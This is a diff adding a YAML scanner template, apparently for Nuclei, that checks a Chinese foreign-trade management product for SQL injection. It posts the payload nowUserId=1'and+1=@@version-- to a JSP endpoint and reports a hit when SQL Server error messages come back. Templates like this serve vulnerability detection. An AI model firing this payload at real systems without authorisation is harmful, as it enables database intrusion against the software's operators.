@@ -1,0 +1,29 @@
+id: poc-yaml-51boss-nowuserid-sqli
+info:
+  name: 博斯外贸管理软件 nowUserId SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /crm/module/DCreceiveBox.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        nowUserId=1'and+1=@@version--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "Microsoft SQL Server"
+      - type: regex
+        part: body
+        regex:
+          - "转换为数据类型为"
+          - "发生语法错误"
